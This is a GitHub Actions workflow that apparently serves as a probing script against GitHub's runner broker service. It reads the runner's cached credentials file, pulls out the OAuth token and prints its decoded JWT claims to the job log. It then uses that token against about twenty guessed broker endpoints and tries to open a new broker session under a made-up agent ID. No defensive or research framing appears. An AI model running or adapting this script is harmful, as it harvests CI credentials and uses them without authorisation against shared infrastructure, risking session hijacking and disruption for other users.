name: Broker Deep Endpoints
on: workflow_dispatch
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Probe all broker endpoints with valid token
        run: |
          BROKER="https://broker.actions.githubusercontent.com"
          CREDS="/home/runner/actions-runner/cached/2.335.1/.credentials"
          TOKEN=$(python3 -c "import json; d=json.load(open('$CREDS')); print(d.get('Data',{}).get('token',''))" 2>/dev/null)
          
          echo "=== Full JWT claims ==="
          python3 -c "
          import json, base64
          d = json.load(open('$CREDS'))
          tok = d['Data']['token']
          parts = tok.split('.')
          payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
          decoded = json.loads(base64.urlsafe_b64decode(payload))
          for k,v in sorted(decoded.items()):
              val = str(v)
              if len(val) > 150:
                  val = val[:150] + '...'
              print(f'{k}: {val}')
          " 2>/dev/null
          
          echo ""
          echo "=== Broker endpoints from runner source ==="
          for path in "/session" "/sessions" "/renew" "/connectivity" \
            "/token" "/refresh" "/status" "/register" "/deregister" \
            "/acquire" "/release" "/task" "/tasks" "/work" "/poll" \
            "/heartbeat" "/ack" "/complete" "/cancel"; do
            RESP=$(curl -s -w "\n%{http_code}" --max-time 2 \
              -H "Authorization: Bearer $TOKEN" "$BROKER$path" 2>/dev/null)
            STATUS=$(echo "$RESP" | tail -1)
            if [ "$STATUS" != "404" ]; then
              BODY=$(echo "$RESP" | head -1)
              echo "  [${STATUS}] $path: ${BODY:0:100}"
            fi
          done
          
          echo ""
          echo "=== Can we create a session? ==="
          curl -s -w "\n%{http_code}" --max-time 3 -X POST \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            "$BROKER/session" \
            -d '{"agentId":"1000000210","agentName":"test"}' | head -3
